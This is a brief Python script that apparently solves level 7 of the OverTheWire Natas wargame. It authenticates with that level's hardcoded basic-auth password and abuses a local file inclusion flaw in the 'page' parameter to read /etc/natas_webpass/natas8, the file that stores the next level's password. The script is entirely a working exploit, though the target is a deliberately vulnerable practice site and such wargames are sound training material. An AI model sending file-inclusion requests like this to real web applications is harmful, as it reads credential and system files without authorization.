import requests

with requests.Session() as s:
    s.auth = ('natas7', 'bmg8SvU1LizuWjx3y7xkNERkHxGre0GS')
    r = s.get('http://natas7.natas.labs.overthewire.org/'
        'index.php?page=/etc/natas_webpass/natas8')

print(r.text)
